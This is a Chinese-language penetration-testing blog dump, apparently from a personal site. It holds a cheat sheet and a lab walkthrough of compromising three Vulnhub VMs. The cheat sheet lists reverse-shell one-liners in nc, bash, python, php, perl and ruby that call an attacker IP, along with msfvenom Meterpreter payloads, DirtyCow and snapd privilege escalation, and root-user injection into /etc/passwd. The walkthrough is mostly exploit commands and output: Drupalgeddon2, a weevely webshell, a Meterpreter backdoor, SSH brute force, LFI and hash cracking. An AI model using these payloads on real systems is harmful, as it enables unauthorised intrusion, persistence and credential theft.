在目录中增加删除文件，修改文件名 x 进入目录以及对目录下的文件进行操作 r-- 可以在不进入目录的情况下列出目录下的文件，但不能查看文件详细信息 –x 可以在单独列出已知文件，并查看文件详细信息 passwd可写 ls -l /etc/passwd 123openssl passwd -6 hackforfun $6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1echo &#39;test:$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd echo写入一定要用**'** EXP提权 CVE-2019-7304 123456Ubuntu 18.10Ubuntu 18.04 LTSUbuntu 16.04 LTSUbuntu 14.04 LTS2.28 &lt; snapd &lt; 2.37网络连通 DirtyCow 12345git clone https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.iocd dirtycow.github.iogcc dirtyc0w.c -o dirtycow -pthread.&#x2F;dirtycow &#x2F;etc&#x2F;group “$(sed ‘&#x2F;\\(sudo*\\)&#x2F; s&#x2F;$&#x2F;,test&#x2F;’ &#x2F;etc&#x2F;group)”sudo su 40616.c 文件传输 FTP SCP HTTP python -m SimpleHTTPServer 80 &amp; 内网代理 meterpreter(socks4) 123msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f raw &gt; shell.phpmsfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f elf &gt; shell.elfuse auxiliary&#x2F;server&#x2F;socks4a portfwd -l 2222 -p 8080 -r 127.0.0.1 (本地服务端口转发/netstat) earthworm(socks5) 访问本地服务 ngork https://ngrok.com/ https://www.tunnelnat.com/ reGeorg frp https://github.com/fatedier/frp 123456789101112131415161718#frpc.ini[common]server_addr &#x3D; 192.168.56.104server_port &#x3D; 7000[sock5_1]type &#x3D; tcpremote_port &#x3D; 45555plugin &#x3D; socks5plugin_user &#x3D; userplugin_passwd &#x3D; pass######################frps.ini[common]bind_port &#x3D; 7000dashboard_port &#x3D; 7500dashboard_user &#x3D; admindashboard_pass &#x3D; admin nps https://github.com/ehang-io/nps lcx 123456lcx配合meterpreter进行公网反弹ShellServer上执行lcx -listen 8888 9999本地执行lcx -slave Server 8888 Local_IP 7777并在MSF监听Local_IP上的7777端口(注意这里不能用127.0.0.1) 目标机器上meterpreter反弹至Server的8888端口 proxychain proxifier sockscap socat socat tcp-listen:1234,fork tcp-connect:localhost:8080 plink plink.exe -ssh root@192.168.0.1 -pw password -R 1234:127.0.0.1:3306 Shell nc 123nc.traditional是最早的版本(v1.10-41.1)，该版本具有&#96;&#96;-e&#96;&#96;的选项，用于反弹shell十分方便ubuntu中的nc命令则会指向netcat-openbsd，而该版本则没有&#96;&#96;-e&#96;&#96;的选项，无法用于反弹shellncat的版本则比较新，集成于nmap中 1234#正向Shellnc -lvvp 8080 -t -e /bin/bash.............................nc 192.168.0.0 8000 12345/bin/bash -i 2&gt;&amp;1 | nc 192.168.0.1 8080rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.0.1 8080 &gt;/tmp/fnc -e /bin/bash 192.168.0.1 8080.............................nc -lvnp 8080 bash 123bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1.............................nc -lvnp 8080 python 1python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.0.1&#x27;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot; php 12php -r &#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1&quot;)&#x27;php -r &#x27;$sock=fsockopen(&quot;192.168.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; perl 1perl -e &#x27;use Socket;$i=&quot;192.168.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; ruby 12ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;192.168.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27; PowerShell 命令多条分隔/命令注入: ; Secure String 12345$password &#x3D; ConvertTo-SecureString &#39;P@ssw0rd&#39; -AsPlainText -Force$Ptr &#x3D; [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)$result &#x3D; [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)$result jail","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"}]},{"title":"Pentest With Meterpreter","slug":"Pentest-With-Meterpreter","date":"2023-02-08T15:55:36.000Z","updated":"2023-02-08T16:08:19.000Z","comments":true,"path":"2023/02/08/Pentest-With-Meterpreter/","link":"","permalink":"https://yoloyolo.top/2023/02/08/Pentest-With-Meterpreter/","excerpt":"迟来的文章","text":"迟来的文章 渗透测试报告 2019/1/28 16:49:43 任务规划 规划区域：虚拟机中的三台服务器 测试目标：获取所有服务器的root权限 渗透目标 A1 hackNos(Ubuntu) IP.0:192.168.31.132 IP.1:Unknown A2 lin.security(Ubuntu) IP.0:Unknown IP.1:Unknown A3 hackNos-2(Ubuntu) IP.0:Unknown 攻击方 B Attacker(Kali) IP.0:192.168.31.10 网络状况： B能与A1进行网络通信 A1能与B和A2进行网络通信 A2能与A1进行网络通信 hackNos 端口扫描 用Nmap对目标A1进行端口扫描 nmap -sV -p 1-1000 -T 5 -v -A -n 192.168.31.132 123456789101112131415Nmap scan report for 192.168.31.132Host is up (0.011s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)| 256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)|_ 256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: OPTIONS GET HEAD POST|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Web路径枚举 dirb http://192.168.31.132 -w 用dirb进行Web目录枚举 1&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.132&#x2F;drupal&#x2F; 发现Web服务中存在Drupal框架 漏洞利用 搜索得知Drupal框架存在RCE漏洞 git clone https://github.com/dreadlocked/Drupalgeddon2.git 尝试对A1使用Exploit 123apt install rubygem install highlineruby drupalgeddon2.rb http:&#x2F;&#x2F;192.168.31.132&#x2F;drupal&#x2F; 成功获取shell 权限提升 本地构造Webshell 1weevely generate pass she.php 开启本地Web服务 python -m SimpleHTTPServer 8000 &amp; 在A1上用wget获取WebShell wget http://192.168.31.10:8000/she.php 连接WebShell weevely http://192.168.31.132/drupal/she.php pass 查看系统信息 12uname -aLinux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux 生成Meterpreter后门程序并投放 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=1234 -e x86/shikata_ga_nai -i 11 -f elf &gt; msf.elf 利用WebShell上传后门程序 file_upload /root/software/msf.elf /var/www/html/drupal/msf.elf 使用MSF进行渗透攻击 12345use exploit&#x2F;multi&#x2F;handlerset payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 1234run 在A1的WebShell中运行后门程序 12chmod +x msf.elf.&#x2F;msf.elf 将meterpreter shell转为bash 12meterpreter &gt; shellpython3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 查看具有suid权限且属于root用户的命令 12345678910111213141516171819202122232425find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null&lt;pal$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign &#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device &#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1 &#x2F;usr&#x2F;bin&#x2F;pkexec &#x2F;usr&#x2F;bin&#x2F;newgidmap &#x2F;usr&#x2F;bin&#x2F;gpasswd &#x2F;usr&#x2F;bin&#x2F;sudo &#x2F;usr&#x2F;bin&#x2F;newgrp &#x2F;usr&#x2F;bin&#x2F;newuidmap &#x2F;usr&#x2F;bin&#x2F;wget &#x2F;usr&#x2F;bin&#x2F;passwd &#x2F;usr&#x2F;bin&#x2F;chsh &#x2F;usr&#x2F;bin&#x2F;chfn &#x2F;bin&#x2F;ping6 &#x2F;bin&#x2F;umount &#x2F;bin&#x2F;ntfs-3g &#x2F;bin&#x2F;mount &#x2F;bin&#x2F;ping &#x2F;bin&#x2F;su &#x2F;bin&#x2F;fusermount 可以用wget命令提权 对/etc/passwd文件进行间接修改 12345hackNos: file_download &#x2F;etc&#x2F;passwd passwdperl -le &#39;print crypt(&quot;hackforfun&quot;,&quot;addedsalt&quot;)&#39; adWo3GnVnKzuUecho &#39;test:adWo3GnVnKzuU:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwdhackNos: wget http:&#x2F;&#x2F;192.168.31.10:8000&#x2F;passwd -O &#x2F;etc&#x2F;passwd 在bash中切换账户 1234su testhackforfunid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) 在Meterpreter查看A1的网络信息 1234567891011121314151617181920212223242526272829303132333435363738ifconfigInterface 1&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : loHardware MAC : 00:00:00:00:00:00MTU : 65536Flags : UP,LOOPBACKIPv4 Address : 127.0.0.1IPv4 Netmask : 255.0.0.0IPv6 Address : ::1IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::Interface 2&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : enp0s3Hardware MAC : 08:00:27:7d:4c:83MTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 192.168.31.132IPv4 Netmask : 255.255.255.0IPv6 Address : fe80::a00:27ff:fe7d:4c83IPv6 Netmask : ffff:ffff:ffff:ffff::IPv6 Address : fe80::a00:27ff:fe7d:4c83IPv6 Netmask : ffff:ffff:ffff:ffff::Interface 3&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : enp0s8Hardware MAC : 08:00:27:65:bd:8bMTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 192.168.56.109IPv4 Netmask : 255.255.255.0IPv6 Address : fe80::a00:27ff:fe65:bd8bIPv6 Netmask : ffff:ffff:ffff:ffff:: 发现192.168.56.0网段 在Meterpreter中添加路由 123456789run autoroute -s 192.168.56.0&#x2F;24run autoroute -pActive Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 192.168.56.0 255.255.255.0 Session 1 在MSF中扫描内网网段 123456use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep set RHOSTS 192.168.56.0&#x2F;24set THREADS 20run[+] 192.168.56.103 appears to be up (CADMUS COMPUTER SYSTEMS) 发现内网机器A2 添加sock代理 123use auxiliary&#x2F;server&#x2F;socks4aset srvport 9999run 修改Proxychain文件 12vim &#x2F;etc&#x2F;proxychains.conf socks4 192.168.31.10 9999 lin.security 端口扫描 proxychains代理Nmap对A2进行端口扫描 proxychains nmap -sT -Pn -v -T5 -A 192.168.56.103 123456789101112131415161718192021222324252627282930313233343536373839404142434445Nmap scan report for 192.168.56.103Host is up (0.0048s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)| 256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)|_ 256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)111&#x2F;tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port&#x2F;proto service| 100000 2,3,4 111&#x2F;tcp rpcbind| 100000 2,3,4 111&#x2F;udp rpcbind| 100000 3,4 111&#x2F;tcp6 rpcbind| 100000 3,4 111&#x2F;udp6 rpcbind| 100003 3 2049&#x2F;udp nfs| 100003 3 2049&#x2F;udp6 nfs| 100003 3,4 2049&#x2F;tcp nfs| 100003 3,4 2049&#x2F;tcp6 nfs| 100005 1,2,3 36117&#x2F;tcp mountd| 100005 1,2,3 36311&#x2F;udp mountd| 100005 1,2,3 50621&#x2F;tcp6 mountd| 100005 1,2,3 58468&#x2F;udp6 mountd| 100021 1,3,4 36071&#x2F;udp nlockmgr| 100021 1,3,4 38529&#x2F;tcp6 nlockmgr| 100021 1,3,4 41451&#x2F;udp6 nlockmgr| 100021 1,3,4 41509&#x2F;tcp nlockmgr| 100227 3 2049&#x2F;tcp nfs_acl| 100227 3 2049&#x2F;tcp6 nfs_acl| 100227 3 2049&#x2F;udp nfs_acl|_ 100227 3 2049&#x2F;udp6 nfs_acl2049&#x2F;tcp open nfs_acl 3 (RPC #100227)Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelNSE: Script Post-scanning.Initiating NSE at 04:02Completed NSE at 04:02, 0.00s elapsedInitiating NSE at 04:02Completed NSE at 04:02, 0.00s elapsedInitiating NSE at 04:02Completed NSE at 04:02, 0.00s elapsedRead data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmapService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds 开放ssh服务与nfs服务 漏洞利用 NFS目录挂载 尝试在A1上挂载A2的/home/peter目录 123456789101112apt-get install nfs-commonvim &#x2F;etc&#x2F;exports &#x2F;share1 *(sync,ro) 192.168.56.103(sync,rw)systemctl restart rpcbindsystemctl restart nfsshowmount -e 192.168.56.103 Export list for 192.168.56.103: &#x2F;home&#x2F;peter *mkdir &#x2F;mnt&#x2F;share1mount -t nfs 192.168.56.103:&#x2F;home&#x2F;peter &#x2F;mnt&#x2F;share1cd &#x2F;mnt&#x2F;share1ls 挂载失败 RPCBind 未找到可以获取Shell的EXP SSH 123proxychains hydra -V -I -f -t 64 -L user -P pass ssh:&#x2F;&#x2F;192.168.56.103:22[22][ssh] host: 192.168.56.103 login: bob password: secret 获取账户“bob” 权限提升 在A1上用SSH登录A2，sudo提权，写入新root账户 123456789101112ssh bob@192.168.56.103sudo -isecretperl -le &#39;print crypt(&quot;hackforfun&quot;,&quot;addedsalt&quot;)&#39; adWo3GnVnKzuUecho &#39;test:adWo3GnVnKzuU:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwdexitexitssh test@192.168.56.103hackforfununame -a Linux linsecurity 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux 构造Meterpreter后门程序 msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=192.168.56.103 LPORT=2345 -e x86/shikata_ga_nai -i 11 -f elf &gt; msf2.elf 将Meterpreter后门程序上传至A2 proxychians scp msf2.elf test@192.168.56.103:/root/msf2.elf 在A2上运行后门程序 12chmod +X msf2.elf.&#x2F;msf2.elf &amp; 12345use exploit&#x2F;multi&#x2F;handlerset payload linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpset RHOST 192.168.56.103set LPORT 2345run 成功获取Shell 12345678910111213141516171819202122232425262728293031323334353637383940414243444546ifconfigInterface 1&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : loHardware MAC : 00:00:00:00:00:00MTU : 65536Flags : UP,LOOPBACKIPv4 Address : 127.0.0.1IPv4 Netmask : 255.0.0.0IPv6 Address : ::1IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::Interface 2&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : enp0s3Hardware MAC : 08:00:27:d8:9f:d6MTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 192.168.56.103IPv4 Netmask : 255.255.255.0IPv6 Address : fe80::a00:27ff:fed8:9fd6IPv6 Netmask : ffff:ffff:ffff:ffff::Interface 3&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : enp0s8Hardware MAC : 08:00:27:be:f1:93MTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 192.168.156.5IPv4 Netmask : 255.255.255.0IPv6 Address : fe80::a00:27ff:febe:f193IPv6 Netmask : ffff:ffff:ffff:ffff::Interface 4&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Name : docker0Hardware MAC : 02:42:f4:43:ba:1bMTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 172.17.0.1IPv4 Netmask : 255.255.0.0 发现192.168.156.0网段 在Meterpreter中添加路由 12345678910run autoroute -s 192.168.156.0&#x2F;24run autoroute -pActive Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 192.168.56.0 255.255.255.0 Session 1 192.168.156.0 255.255.255.0 Session 2 在MSF中扫描内网网段 123456use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep set RHOSTS 192.168.156.0&#x2F;24set THREADS 20run[+] 192.168.156.6 appears to be up (CADMUS COMPUTER SYSTEMS) 发现内网机器A3 hackNos-2 端口扫描 proxychains nmap -sT -Pn -v -T5 -A 192.168.156.6 12345678910111213141516Nmap scan report for 192.168.156.6Host is up (0.00095s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)| 256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)|_ 256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksMAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%) Web路径枚举 dirb http://192.168.156.6 -w 123456789---- Scanning URL: http:&#x2F;&#x2F;192.168.156.6&#x2F; ----+ http:&#x2F;&#x2F;192.168.156.6&#x2F;index.html (CODE:200|SIZE:10918) + http:&#x2F;&#x2F;192.168.156.6&#x2F;server-status (CODE:403|SIZE:278) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; ---- Entering directory: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; ----+ http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-admin&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F; 漏洞利用 使用wpscan针对wordpress进行扫描 proxychains wpscan --url http://192.168.156.6/tsweb/ --enumerate u 123456789[i] User(s) Identified:[+] user | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) 发现存在用户user 12345678910111213141516$ wpscan --url http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; --enumerate p[i] Plugin(s) Identified:[+] gracemedia-media-player | Location: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F; | Latest Version: 1.0 (up to date) | Last Updated: 2013-07-21T15:09:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.0 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt 存在插件gracemedia-media-player 搜索得到相关EXP wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd 得到两条重要信息 rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash 可以破解flag账户的密码 权限提升 使用john进行字典爆破 1234echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwdjohn --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwdjohn --show passwd topsecret 使用flag账户登入 12proxychains ssh flag@192.168.156.6topsecret 而登入时使用的是rbash，在进行操作时会很不方便，需要切换到bash 123python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39; 以上三条命令均可 尝试直接sudo提权，失败 尝试在目标服务器内搜索信息 发现文件/var/backups/passbkp/md5-hash 12cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash $1$rohit$01Dl0NQKtgfeL08fGrggi0 得到rohit账户的密码 使用john破解密码 1234echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2john --show passwd2 !%hack41 切换到rohit账户，并尝试sudo提权 123456su rohit!%hack41sudo -i!%hack41id uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) 内网渗透的几个思路 proxychains+meterpreter 在获取机器的权限之后，上传meterpreter后门，然后建立路由，再借以本机的socks代理服务来进行流量转发，但是需要注意免杀，以及控制的持续化。meterpreter的便利之处在于，可以建立路由然后便于MSF对于内网的直接渗透，以及附带的许多使用功能。 proxychains+earthworm 与meterpreter类似，但是只是上传一个流量转发工具而不是后门程序，所以可能不太会需要考虑到免杀这一方面，但是开启代理服务的话貌似还是有点危险的。而且如果进行多层渗透的话，可能需要相应的多搭几条代理路线，在操作时可能需要记下相应的信息。 nmap进行扫描最好带上-n来取消掉dns解析","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://yoloyolo.top/tags/Vulnhub/"}]},{"title":"Vulnhub_Walkthrough_Set","slug":"Vulnhub-Walkthrough-Set","date":"2023-02-08T13:05:32.000Z","updated":"2023-02-08T15:50:27.000Z","comments":true,"path":"2023/02/08/Vulnhub-Walkthrough-Set/","link":"","permalink":"https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/","excerpt":"迟来的文章","text":"迟来的文章 Os-hackNos-1 2019/11/30 22:06:46 端口扫描 nmap -sV -Pn -v -T5 -A 192.168.56.104 123456789101112PORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)| 256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)|_ 256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: POST OPTIONS GET HEAD|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksAggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%) Web路径枚举 dirb http://192.168.56.104 -w 1234567891011121314151617---- Scanning URL: http:&#x2F;&#x2F;192.168.56.104&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F; + http:&#x2F;&#x2F;192.168.56.104&#x2F;index.html (CODE:200|SIZE:11321) + http:&#x2F;&#x2F;192.168.56.104&#x2F;server-status (CODE:403|SIZE:279) ---- Entering directory: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;includes&#x2F; + http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;index.php (CODE:200|SIZE:7687) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;misc&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;modules&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;profiles&#x2F; + http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;robots.txt 